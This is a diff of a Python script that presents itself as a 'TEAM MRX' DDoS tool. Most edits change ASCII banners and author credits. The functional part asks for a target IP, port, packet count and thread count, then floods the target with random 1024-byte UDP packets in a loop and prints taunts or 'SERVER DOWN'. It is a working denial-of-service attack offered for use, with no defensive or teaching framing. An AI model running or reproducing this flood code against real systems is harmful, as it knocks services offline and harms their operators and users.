@@ -25,16 +25,13 @@ if platform.system() == 'Windows':
 ██████╔╝██████╔╝╚█████╔╝██████╔╝
 ╚═════╝░╚═════╝░░╚════╝░╚═════╝░
 
-Created by zinou
+Created by Zinou
 
 	""")
 else :
 	print("""
  TEAM MRX is Presenting to you :
 
-
-print('''
-\033[35m
  ⠛⠛⣿⣿⣿⣿⣿⡷⢶⣦⣶⣶⣤⣤⣤⣀⠀⠀⠀
  ⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
  ⠀⠀⠀⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇⠀
@@ -42,19 +39,20 @@ print('''
  ⠀⠀⠀⠀⠹⠏⠀⠀⠀⣿⣧⠀⠹⣿⣿⣿⣿⣿⡿⣿
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠦⠴⢿⢿⣿⡿⠷⠀⣿⠀
-             Zinou
+             KARASKO
  ⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣤⣤⣤⣤⣤⣶⣦⠃⠀
  ⠀⠀⠀⠀⠀⠀⠀⢐⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
  ⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟⠁
-dev:zinou
-owner:9ochi7a
+		""")
+
+
 print("DDos")
-ip= str(input("                    Server ip MRX :"))
-port= int(input("                   X port MRX :"))
-choice = str(input("                   X DDoS Attack?? (y/n) MRX :"))
-times= int(input("                   X Paket MRX :"))
-threads= int(input("                   X threads MRX :"))
+ip= str(input("                    Server ip MRX  :"))
+port= int(input("                    port MRX :"))
+choice = str(input("                    DDoS Attack?? (y/n) MRX :"))
+times= int(input("                    Paket MRX :"))
+threads= int(input("                    threads MRX :"))
 def run():
 	data = random._urandom(1024)
 	i = random.choice(("[-]","[•]","[×]"))
@@ -64,7 +62,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +"TEAM MRX TA9TA7EM!!!!!!")
+			print(i +"TEAM MRX TNIK!!!!!!")
 		except:
 			print("[!] SERVER DOWN!!!")
 
